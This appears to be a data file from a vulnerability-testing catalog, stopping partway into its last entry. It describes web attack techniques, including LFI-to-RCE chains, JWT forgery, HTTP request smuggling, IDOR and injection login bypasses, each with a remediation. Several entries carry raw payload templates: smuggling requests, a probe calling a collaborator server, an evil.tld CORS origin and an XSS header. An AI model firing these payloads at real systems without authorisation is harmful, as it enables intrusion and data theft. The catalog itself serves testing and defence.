description: Exploiting unclaimed CNAME records pointing to decommissioned external services allows attackers to host malicious content or phishing pages under a trusted domain.
remediation: Remove unused CNAME records and monitor DNS configurations.

title: Subdomain Takeover via DNS Wildcard
description: A DNS wildcard record pointing to a third-party service can be exploited. An attacker can create an account on that service and register the name, causing arbitrary subdomains to point to their controlled content.
remediation: Avoid wildcard DNS records pointing to third-party services or implement strict validation.

title: Inject Cc and Bcc after sender argument in email
description: Injecting Cc and Bcc recipients after the sender argument in an email can cause the email to be sent to unintended recipients.
remediation: Sanitize and validate all user-supplied input used in email headers.

title: Inject To argument in email
description: Injecting a 'To' argument after the sender can cause the email to be sent to an attacker-controlled address in addition to the intended recipient.
remediation: Sanitize and validate all user-supplied input used in email headers.

title: Inject Subject argument in email
description: Injecting a 'Subject' argument can alter or replace the original email subject, potentially misleading the recipient.
remediation: Sanitize and validate all user-supplied input used in email headers.

title: Change email body via injection
description: Injecting a two-line feed can allow an attacker to change the body of the email, inserting their own content.
remediation: Sanitize and validate all user-supplied input used in email bodies.

title: PHP mail() function additional_parameters RCE
description: Controlling the $additional_parameters argument of PHP's mail() function can lead to command injection by passing arguments to the underlying sendmail binary.
remediation: Avoid using the $additional_parameters argument of the mail() function with user-controlled input. If necessary, strictly sanitize and validate the input.

title: Email address tagging bypass
description: Email servers may ignore characters like '+', '-', and '{}' or comments in parentheses, allowing for bypassing email validation or routing rules.
remediation: Implement robust email address validation that accounts for various tagging and comment syntaxes.

title: Email address with IP address domain
description: Using an IP address enclosed in square brackets as the domain part of an email address can be accepted by some mail servers, potentially bypassing intended recipient checks.
remediation: Validate email addresses to ensure the domain is a valid hostname and not an IP address unless explicitly supported and intended.

title: Email address encoding injection
description: Email addresses can contain encoded characters using various schemes (quoted-printable, base64, punycode). Exploiting these encodings can lead to sending emails to unintended recipients or injecting special characters.
remediation: Strictly validate and decode email addresses, ensuring that encoded payloads do not alter the intended recipient or introduce malicious characters.

title: SSO email XSS
description: If an SSO provider allows XSS payloads in email addresses and a relying party application does not sanitize them, an XSS vulnerability can be triggered when the email is displayed.
remediation: Sanitize all user-supplied data, including email addresses, before rendering them in HTML.

title: SSO account takeover via unverified email
description: If an SSO service allows account creation without email verification and a downstream application trusts this SSO, an attacker can take over accounts by creating an SSO account with a victim's email.
remediation: Always verify email addresses during SSO account creation and ensure downstream applications check for email verification status.

title: Reply-To header spoofing
description: By setting the 'Reply-To' header to an attacker-controlled address while sending from a legitimate domain, automatic replies or user responses can be redirected to the attacker.
remediation: Validate and sanitize the 'Reply-To' header to ensure it points to a legitimate and expected address.

title: AWS SES Hard Bounce Rate Suspension
description: Exceeding the hard bounce rate threshold (e.g., 10%) in AWS SES can lead to suspension or blocking of email sending capabilities, impacting service availability.
remediation: Maintain a low hard bounce rate by regularly cleaning email lists and validating recipient addresses.

title: Remote File Inclusion (RFI)
description: The server includes a file from a remote server, which can lead to code execution if the remote file contains malicious code. This is often enabled by the `allow_url_include` directive in PHP.
remediation: Disable `allow_url_include` and `allow_url_fopen` in PHP configuration, and validate all user-supplied input for file inclusion functions.

title: Local File Inclusion (LFI)
description: The server includes a local file based on user-controlled input, allowing attackers to read sensitive files on the server. This often occurs when user input is directly passed to file inclusion functions.
remediation: Sanitize user input, use a whitelist of allowed files, and avoid passing user input directly to file inclusion functions.

title: HTML-to-PDF SVG/IMG Path Traversal
description: HTML-to-PDF engines can parse attacker-provided HTML/SVG, allowing local file exfiltration if the worker has filesystem access. Vulnerabilities exist in how paths are processed, especially with encoding and URL decoding order.
remediation: Update HTML-to-PDF libraries to patched versions that canonicalize paths before processing and ensure proper input validation.

title: Exposed .git Repository (Source Disclosure)
description: If a web server exposes the `.git` directory, attackers can reconstruct the entire code repository, potentially revealing secrets, hidden endpoints, and sensitive information.
remediation: Configure the web server to deny access to the `.git` directory.

title: LFI2RCE via compress.zlib:// and PHP_STREAM_PREFER_STDIO
description: Exploits a race condition where a temporary file created by compress.zlib:// with PHP_STREAM_PREFER_STDIO can be manipulated. An attacker can send compressed data, get the temporary file path disclosed, and then append malicious PHP code before the application includes the file.
remediation: Ensure proper input validation and avoid race conditions by not relying on temporary files for sensitive operations or by implementing robust locking mechanisms.

title: Local File Inclusion leading to Remote Code Execution
description: When a file is uploaded to PHP, it generates a temporary file. If an attacker can include this temporary file via a Local File Inclusion vulnerability, they can achieve Remote Code Execution.
remediation: Sanitize user-supplied input used in file inclusion functions and ensure temporary files are properly cleaned up.

title: Eternal Wait LFI for Brute-forcing Uploaded Files
description: This technique involves making an LFI request never end, creating a window of opportunity to brute-force uploaded temporary files. This is achieved by including a file that causes an infinite loop or long processing time.
remediation: Implement timeouts for requests and properly handle file inclusion to prevent infinite loops.

title: PHP Segmentation Fault to Prevent Temporary File Deletion
description: Causing a segmentation fault in PHP can prevent temporary uploaded files from being deleted, similar to the eternal wait technique but without needing a zero-day exploit. This allows more time to find and exploit uploaded files.
remediation: Address the underlying cause of segmentation faults and ensure robust error handling for file uploads.

title: PHP-FPM Request Timeout for Temporary File Generation
description: By configuring PHP-FPM's 'request_terminate_timeout', attackers can cause requests to be killed after a set time, preventing temporary uploaded files from being deleted. This accelerates the process of generating and finding these files.
remediation: Configure PHP-FPM 'request_terminate_timeout' appropriately and ensure secure file handling.

title: LFI to RCE via Nginx temp files and procfs
description: Nginx buffering request bodies to temporary files can be exploited via LFI. By manipulating file descriptors in /proc/<pid>/fd/<fd>, an attacker can trick PHP's include/require into executing unlinked temporary files, leading to RCE.
remediation: Disable or properly configure Nginx buffering (e.g., `proxy_request_buffering off`, tune `client_body_buffer_size`, set `proxy_max_temp_file_size` to 0).

title: Path traversal bypass using procfs for LFI
description: Attackers can use chained traversals through /proc/<pid>/cwd/proc/<pidB>/root/proc/<pidC>/fd/<fd> to bypass realpath() normalization and reach sensitive files or symlinks, including those pointing to unlinked nginx temp files.
remediation: Sanitize and validate all user-supplied file paths to prevent directory traversal.

title: Local File Inclusion for file reading
description: A Local File Inclusion vulnerability allows an attacker to include and execute arbitrary files on the server. This can be used to read sensitive files or, in conjunction with other vulnerabilities, achieve remote code execution.
remediation: Validate and sanitize all user-supplied file paths to ensure they only point to intended files.

title: LFI to RCE via PHP Filters
description: Leveraging PHP filters like convert.iconv and convert.base64-decode to construct arbitrary PHP code within a Local File Inclusion (LFI) vulnerability. This allows for remote code execution by manipulating the include mechanism.
remediation: Sanitize user input for file inclusion parameters and avoid using PHP filters for file handling when user input is involved.

title: PHP Filters for Adding Suffixes
description: PHP filters can be chained to manipulate the output of an included file, allowing for the addition of arbitrary suffixes. This can be useful for formatting output or creating specific file types.
remediation: Validate and sanitize user input to prevent unexpected filter chaining and output manipulation.

title: LFI to RCE via PHPInfo Race Condition
description: Exploits a race condition where a multipart/form-data POST request to a phpinfo() page leaks the temporary upload file path in the response. By padding the request to force early output flushing, an attacker can parse the temporary path and include it via a Local File Inclusion (LFI) vulnerability before PHP deletes the temporary file.
remediation: Disable file uploads if not needed, disable phpinfo() in production, or restrict file inclusion paths using open_basedir.

title: LFI to RCE via PHP Temporary File Uploads on Windows
description: Exploits PHP's creation of temporary files during POST uploads on Windows. Attackers leverage wildcards (like '<<') supported by the Windows FindFirstFile API to include and execute the temporary file via an LFI vulnerability without needing to guess its exact randomized name.
remediation: Avoid passing user-controlled input directly to file inclusion functions, and implement strict whitelisting for allowed files.

title: PHP Phar Deserialization via Stream Wrappers
description: PHP automatically deserializes metadata when a phar:// stream wrapper is used in filesystem functions, allowing attackers to trigger PHP Object Injection and Remote Code Execution if they control the file path.
remediation: Avoid passing user-controlled input directly to filesystem functions, and disable the phar stream wrapper if it is not required.

title: LFI to RCE via PHP_SESSION_UPLOAD_PROGRESS
description: Leverages the PHP session upload progress mechanism to force session creation and inject arbitrary PHP code into the session file via a multipart POST request, which is then executed through a Local File Inclusion vulnerability.
remediation: Disable session.upload_progress.enabled in php.ini, or implement strict whitelisting on file inclusion inputs.

title: Arbitrary File Upload via Extension Bypass
description: Bypassing file extension restrictions using alternative extensions, double extensions, trailing special characters, or NTFS alternate data streams to upload and execute malicious scripts.
remediation: Implement strict whitelist-based extension validation and store uploaded files outside the web root with non-executable permissions.

title: CSV Formula Injection via Dynamic Data Exchange
description: Attackers inject malicious spreadsheet formulas utilizing Dynamic Data Exchange (DDE) into CSV inputs, executing arbitrary commands when the file is opened in Excel.
remediation: Prepend a single quote (') to any cell value starting with =, +, -, or @ before exporting to CSV.

title: Permissive CORS Policy on gRPC-Web Proxy
description: A misconfigured gRPC-Web proxy reflects arbitrary Origins and returns Access-Control-Allow-Credentials: true, allowing malicious sites to make authenticated cross-site gRPC-Web calls.
payload_templates:
OPTIONS /pkg.svc.v1.Service/Method HTTP/1.1
Host: host.tld
Origin: https://evil.tld
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,grpc-timeout
remediation: Configure the CORS policy on the proxy to only allow trusted origins and avoid wildcard or reflected origins when credentials are enabled.

title: LFI to RCE via segmentation fault leaving temporary files
description: Triggering a PHP segmentation fault during file upload leaves temporary files undeleted. An attacker can brute-force the temporary file path via LFI to include and execute arbitrary PHP code.
remediation: Upgrade PHP and ensure proper error handling to prevent segmentation faults; validate and sanitize file uploads.

title: XML External Entity (XXE) in PDF uploads via malicious SVG or PDF content
description: Malicious PDF or SVG files uploaded to a server can trigger XXE when parsed, allowing attackers to read local files or exfiltrate data via crafted XML entities.
remediation: Disable external entity processing in XML/SVG/PDF parsers and use safe parsing libraries.

title: CORS bypass via PDF upload due to misconfigured Access-Control-Allow-Origin
description: A PDF upload endpoint may expose sensitive data by reflecting arbitrary Origin headers in Access-Control-Allow-Origin, enabling attackers to bypass CORS restrictions and read responses.
remediation: Set Access-Control-Allow-Origin to a strict whitelist of trusted domains.

title: H2C Smuggling via Upgrade header manipulation
description: Exploits reverse proxy handling of HTTP/2 upgrade headers to bypass path-based routing, authentication, and WAF protections by establishing a persistent H2C connection.
remediation: Configure reverse proxies to validate and sanitize Upgrade and Connection headers strictly.

title: WebSocket Smuggling via invalid Sec-WebSocket-Version
description: Abuses reverse proxy misvalidation of WebSocket upgrade headers to establish a tunnel to internal APIs by sending an incorrect Sec-WebSocket-Version header.
remediation: Validate WebSocket upgrade headers strictly and reject malformed upgrade requests.

title: WebSocket Smuggling via external 101 response
description: Tricks reverse proxy into maintaining an open connection by leveraging an external endpoint returning HTTP 101, enabling access to internal APIs.
remediation: Ensure proxies validate full upgrade handshake and do not rely solely on status codes.

title: JWT Algorithm Confusion to 'none'
description: Forces the server to accept a JWT with the 'alg' header set to 'none', bypassing signature verification. Requires the application to not validate the algorithm properly.
remediation: Enforce strict algorithm whitelisting and reject 'none' algorithm.

title: JWT Key Confusion from RS256 to HS256
description: Changes the JWT algorithm from RS256 to HS256 and uses the server's RSA public key as the HMAC secret to forge valid signatures.
remediation: Validate algorithm strictly and avoid using public keys for symmetric verification.

title: JWT Embedded Public Key in Header
description: Embeds a new public key in the JWT header and tricks the server into using it for signature verification instead of the intended key.
remediation: Reject tokens with untrusted or dynamically provided keys in headers.

title: JWT JWKS URL Spoofing
description: Modifies the 'jku' header claim to point to an attacker-controlled JWKS endpoint, allowing interception of key material or manipulation of token verification.
remediation: Restrict 'jku' to trusted domains and validate JWKS integrity.

title: JWT Path Traversal via 'kid' Parameter
description: Exploits the 'kid' header claim to perform path traversal and read arbitrary files or trigger SSRF by specifying filesystem paths or URLs.
remediation: Sanitize and validate 'kid' values; avoid using filesystem paths for key lookup.

title: JWT HMAC Secret Brute Force
description: Brute-forces the HMAC secret used in HS256-signed JWTs to forge valid tokens. Feasible when weak or reused secrets are used.
remediation: Use strong, unique secrets and enforce short token lifetimes.

title: JWT Secret Derivation from Leaked Config/DB
description: Derives JWT signing secrets from exposed application encryption keys and user data, enabling forgery without password knowledge.
remediation: Protect configuration and database dumps; use strong key derivation.

title: JWE-Wrapped PlainJWT Signature Bypass in pac4j-jwt
description: In vulnerable pac4j-jwt versions, a PlainJWT (alg=none) wrapped in a JWE is accepted without signature verification when the inner token is malformed, allowing full authentication bypass.
remediation: Upgrade pac4j-jwt to patched versions; validate inner JWT structure and signature.

title: Cookie jar overflow via JavaScript cookie eviction
description: Abusing browser cookie jar limits to evict existing cookies and recreate them without HttpOnly protection, allowing session hijacking when JavaScript execution is possible. Requires matching original cookie scope (name, Path, Domain) to succeed.
remediation: Set HttpOnly and Secure flags on sensitive cookies and avoid relying on cookie scope alone for security.

title: Cookie Tossing via subdomain control or XSS
description: An attacker sets a cookie for a domain and its subdomains via subdomain control or XSS, influencing victim sessions. The browser may send both attacker and legitimate cookies, with the first or most specific taking precedence.
remediation: Use __Host- prefixed cookies and ensure Secure, Path=/, and no Domain attributes.

title: Cookie Overflow to bypass cookie validation
description: An attacker causes a cookie overflow to delete the legitimate cookie, then sets a malicious one. Bypasses protections checking for duplicate cookie names by URL-encoding cookie names.
remediation: Reject requests with duplicate cookie names and decode cookie names before validation.

title: First-request Host header validation bypass via connection reuse
description: Reverse proxies that only validate the Host header on the first request of a connection allow attackers to reuse the same TCP/TLS channel to access internal hosts by sending a second request with a different Host header.
payload_templates:
GET / HTTP/1.1
Host: allowed-external-host.example

GET /admin HTTP/1.1
Host: internal-only.example
remediation: Re-validate the Host header on every request within the same connection.

title: First-request routing leading to Host header manipulation
description: HTTP/1.1 reverse proxies that map backend pools based solely on the first request allow subsequent requests with altered Host headers to reach unintended internal hosts, enabling SSRF-like access.
payload_templates:
GET / HTTP/1.1
Host: public.example

POST /pwreset HTTP/1.1
Host: private.internal
remediation: Re-validate Host headers on every request and disable connection pooling for sensitive routes.

title: HTTP/2 connection reuse enabling request smuggling in Apache Traffic Server
description: Apache Traffic Server versions before 9.2.2 allowed request smuggling via HTTP/2 connection reuse when parent proxy routing was enabled, permitting access to internal hosts.
remediation: Upgrade to Apache Traffic Server 9.2.2 or later and disable parent proxy routing if not required.

title: Improper :authority validation after first stream in Envoy Proxy
description: Envoy Proxy versions before 1.29.0 improperly validated the :authority header after the first stream, enabling cross-tenant request smuggling in shared meshes.
remediation: Upgrade to Envoy Proxy 1.29.0 or later and enforce strict :authority validation on every request.

title: HTTP/2 connection coalescing abuse via browser multiplexing
description: Modern browsers coalesce HTTP/2/3 requests onto a single TLS connection when certificate, ALPN, and IP match. If a front-end only validates the first request, subsequent coalesced requests inherit that authorization even if the Host changes.
remediation: Disable origin coalescing on CDN/load-balancer layers and re-validate Host/:authority on every request.

title: HTTP Request Smuggling via CL.TE discrepancy
description: Front-end uses Content-Length while back-end uses Transfer-Encoding chunked, causing the back-end to interpret part of the body as a separate request.
payload_templates:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: HTTP Request Smuggling via TE.CL discrepancy
description: Front-end uses Transfer-Encoding chunked while back-end uses Content-Length, causing the back-end to truncate the request and treat the remainder as a new request.
payload_templates:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: HTTP Request Smuggling via TE.TE obfuscation
description: Both servers support Transfer-Encoding but one can be tricked into ignoring it via header obfuscation, leading to desync.
payload_templates:
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X
Transfer-Encoding: chunked
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: HTTP Request Smuggling via CL.0 discrepancy
description: Front-end processes Content-Length while back-end ignores it, causing the back-end to wait for a body that never arrives, enabling request splitting.
payload_templates:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: HTTP Request Smuggling via TE.0 discrepancy
description: Front-end processes Transfer-Encoding while back-end ignores it, causing the back-end to treat the body as a new request.
payload_templates:
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Transfer-Encoding: chunked
Connection: keep-alive

50
GET http://our-collaborator-server/ HTTP/1.1
x: X
0
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: HTTP Request Smuggling via 0.CL discrepancy
description: Front-end ignores Content-Length while back-end uses it, causing the back-end to wait for a body that never arrives, enabling request splitting.
payload_templates:
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
remediation: Configure front-end and back-end to agree on header precedence; disable ambiguous headers.

title: Browser-powered HTTP request smuggling via client-side desync
description: Abuses a victim's browser to enqueue a mis-framed request on a shared connection, causing downstream components to parse subsequent requests out-of-sync. Payloads are constrained to what browsers can legally send cross-origin.
remediation: Implement strict length limits, chunked encoding validation, and connection state tracking.

title: HTTP/2 downgrade request splitting via mod_proxy rewrite rules
description: Apache HTTP Server mod_proxy rewrite rules could be chained to split and smuggle requests during HTTP/2 downgrades to HTTP/1.1. This allows attackers to inject malicious requests into the back-end server.
remediation: Upgrade to Apache HTTP Server 2.4.56 or later.

title: HAProxy HTX parser request smuggling in HTTP/2 downgrades
description: HAProxy 2.7/2.6 mishandled pipelined requests during HTTP/2 to HTTP/1.1 downgrades, enabling request smuggling attacks. Attackers can exploit this to poison the back-end request queue.
remediation: Apply HAProxy patches or upgrade to a fixed version.

title: Go MaxBytesHandler cross-protocol request smuggling via HTTP/2 frames
description: Go's MaxBytesHandler left-over body bytes were parsed as HTTP/2 frames, enabling cross-protocol request smuggling. This allows attackers to inject requests into the back-end server.
remediation: Apply Go updates addressing the MaxBytesHandler issue.

title: HTTP/2 to HTTP/1.1 downgrade request smuggling via Transfer-Encoding (H2.TE)
description: Front-end trusts HTTP/2 frame length while back-end trusts Transfer-Encoding: chunked during downgrade, causing desynchronization. Attackers can smuggle requests by embedding an incomplete chunked body.
remediation: Strip user-supplied Transfer-Encoding headers during downgrades and enforce a single source of length truth.

title: HTTP/2 to HTTP/1.1 downgrade request smuggling via Content-Length (H2.CL)
description: Front-end trusts HTTP/2 frame length while back-end trusts Content-Length during downgrade, causing desynchronization. Attackers can smuggle requests by sending a smaller Content-Length than the actual body.
remediation: Strip user-supplied Content-Length headers during downgrades and enforce a single source of length truth.

title: HTTP/2 clear-text upgrade (h2c) request smuggling
description: Attackers tunnel raw HTTP/2 frames through an edge that only validated HTTP/1.1 by using the Upgrade: h2c header. This bypasses header normalization, WAF rules, and TLS termination.
remediation: Strip or hard-code the Upgrade header at the edge except for WebSockets.

title: HTTP Response Queue Desynchronisation via Smuggling
description: Abuses HTTP Request Smuggling to desynchronize response queues, causing victims to receive attacker-controlled responses or leaking their responses. Exploits timing differences between smuggled and legitimate requests.
payload_templates:
GET / HTTP/1.1
Host: target
Content-Length: 150

HEAD / HTTP/1.1
Host: target

TRACE / HTTP/1.1
Host: target
X-Pad: ...padding...
X: <script>alert(1)</script>
remediation: Configure front-end and back-end to use consistent HTTP parsers and disable HTTP pipelining.

title: Cache Poisoning via HTTP Response Desynchronisation
description: Poisons cache by injecting malicious responses via response queue desynchronisation, causing XSS or other attacks to be served from cache to other users.
payload_templates:
GET / HTTP/1.1
Host: target
Content-Length: 150

HEAD / HTTP/1.1
Host: target

TRACE / HTTP/1.1
Host: target
X-Pad: ...padding...
X: <script>alert(1)</script>
remediation: Sanitize cache headers and disable storing responses with suspicious content.

title: Web Cache Deception via Response Desynchronisation
description: Causes sensitive user data to be cached by tricking the cache into storing responses for non-cacheable URLs by manipulating response queue desynchronisation.
payload_templates:
GET /private HTTP/1.1
Host: target
Content-Length: 150

HEAD /private HTTP/1.1
Host: target
remediation: Configure cache-control headers properly and avoid caching sensitive responses.

title: Sequential numeric IDOR via predictable identifiers
description: Exploits predictable, sequential numeric identifiers in endpoints to access unauthorized data by incrementing/decrementing IDs. Often leads to mass data exposure or account takeover.
remediation: Replace sequential IDs with unguessable tokens (UUIDv4/ULID) and enforce server-side authorization checks.

title: Encoded bearer token IDOR via weak QR/wristband IDs
description: Exploits short, predictable QR/wristband IDs encoded as hex/Base64 to access media/PII without authentication. Enumeration of the small keyspace is trivial.
remediation: Bind IDs to user sessions and use high-entropy tokens; implement rate-limiting and logging.

title: Multi-parameter IDOR in chat/user pairing endpoints
description: Exploits endpoints accepting multiple user/object IDs where authorization checks are absent. Allows unauthorized access to private conversations or shared resources.
remediation: Enforce per-user authorization on all object references in multi-ID endpoints.

title: Error-message oracle for user/file enumeration
description: Uses subtle differences in error messages to enumerate valid usernames or filenames, enabling unauthorized access to documents or credentials.
remediation: Standardize error messages and implement proper authorization checks.

title: Iframe trap via full-viewport XSS to steal navigation and form data
description: Abuse XSS to trap victims inside a full-viewport iframe that overlays the entire screen, preventing them from noticing they remain on the malicious page. Listeners capture navigation events, form submissions, and localStorage data.
remediation: Set X-Frame-Options DENY or Content-Security-Policy frame-ancestors 'none' and avoid allowing arbitrary iframe embedding.

title: SnakeYAML Deserialization RCE via unsafe Java class loading
description: SnakeYAML before 2.0 deserializes arbitrary Java classes when using the default Constructor, enabling gadget chains that lead to remote code execution. Attackers can craft YAML payloads to load malicious classes from remote URLs.
remediation: Upgrade to SnakeYAML ≥2.0 or use SafeConstructor/SafeLoader.

title: LDAP login bypass via filter manipulation
description: Improperly sanitized user input allows attackers to craft LDAP filters that bypass authentication by manipulating logical operators and wildcards.
remediation: Use parameterized queries and strict input validation for LDAP filters.

title: Blind LDAP injection via boolean inference
description: LDAP queries constructed from user input can be manipulated to infer data existence via true/false responses when error messages are suppressed.
remediation: Sanitize inputs and use allow-lists for LDAP filter components.

title: LDAP attribute brute-force data exfiltration
description: Attackers can enumerate LDAP attributes by brute-forcing possible values and observing application responses to reconstruct stored data.
remediation: Implement strict input validation and rate limiting on LDAP queries.

title: Comment-based HTML source inspection for hidden parameters
description: Inspecting HTML source for comments or hidden inputs can reveal undocumented parameters or endpoints that may be used to bypass authentication.
remediation: Remove sensitive comments and hidden inputs from HTML source.

title: Direct access to restricted pages without authentication
description: Accessing restricted pages by manipulating URLs or removing authentication checks allows unauthorized access to sensitive functionality.
remediation: Enforce authentication checks on all restricted endpoints.

title: Login bypass by omitting or sending minimal parameters
description: Sending no parameters or only one parameter during login may cause the application to skip validation logic, allowing authentication bypass.
remediation: Validate all required parameters and enforce strict schema checks.

title: PHP loose comparison bypass using array parameters
description: PHP's loose comparison can be exploited by sending array parameters (e.g., user[]=a&pwd[]=b) to bypass authentication checks due to type juggling.
remediation: Use strict comparison operators and validate input types.

title: Login bypass by sending JSON content with GET or POST
description: Sending JSON payloads (including boolean true) via Content-Type: application/json, even with GET requests, may bypass server-side parsing logic.
remediation: Enforce strict content-type validation and reject unexpected JSON in GET requests.

title: Node.js MySQL object injection leading to SQL authentication bypass
description: Sending nested JSON objects (e.g., password[password]=1) in Node.js with mysqljs library can transform into malformed SQL queries where the password condition always evaluates to true.
remediation: Disable object parsing in MySQL connections or use strict input validation.

title: Authentication bypass using default credentials
description: Attempting login with default usernames and passwords (e.g., admin:admin, root:root) can grant unauthorized access if defaults are unchanged.
remediation: Change default credentials and enforce strong password policies.

title: Authentication bypass using common username/password combinations
description: Trying common combinations like 'admin:password', 'admin:techname', or 'user:123456' can bypass login if weak credentials are used.
remediation: Enforce strong password policies and disable weak defaults.

title: SQL injection authentication bypass via classic payloads
description: Injecting SQL payloads such as ' or '1'='1 into login fields can bypass authentication by making the WHERE clause always true.
remediation: Use prepared statements with parameterized queries.

title: NoSQL injection authentication bypass via object injection
description: Injecting NoSQL-specific payloads (e.g., changing parameter structure) can manipulate queries to bypass authentication in NoSQL databases.
remediation: Use NoSQL parameterized queries and input validation.

title: XPath injection authentication bypass
description: Injecting XPath expressions into login fields can manipulate XML-based authentication logic to bypass checks.
remediation: Use XPath parameterized queries and sanitize inputs.

title: LDAP injection authentication bypass
description: Injecting LDAP filters into login fields can manipulate directory queries to bypass authentication.
remediation: Sanitize LDAP inputs and use parameterized queries.

title: Session hijacking via insecure 'Remember Me' functionality
description: Abusing weak 'Remember Me' token generation or storage can allow session hijacking and account takeover.
remediation: Use secure, time-limited tokens with strong cryptographic properties.

title: Open redirect via login redirect parameter
description: Manipulating the redirect parameter after login to point to an external domain can be used for phishing or stealing sensitive data.
remediation: Validate and whitelist redirect URLs.

title: Username enumeration via login functionality
description: Abusing login responses to determine valid usernames based on error messages or timing differences.
remediation: Use generic error messages and constant-time responses.

title: SQL Authentication Bypass via tautology
description: Injecting tautologies like ' OR '1'='1 into login fields to bypass authentication by making the WHERE clause always true.
remediation: Use parameterized queries and never concatenate raw input into SQL.

title: SQL Union-Based Injection to extract data
description: Injecting UNION SELECT statements to append attacker-controlled data to the original query result set, enabling data exfiltration.
oracle_hints: database version or user data displayed
remediation: Use parameterized queries and strict input validation.

title: Mass Assignment leading to Privilege Escalation
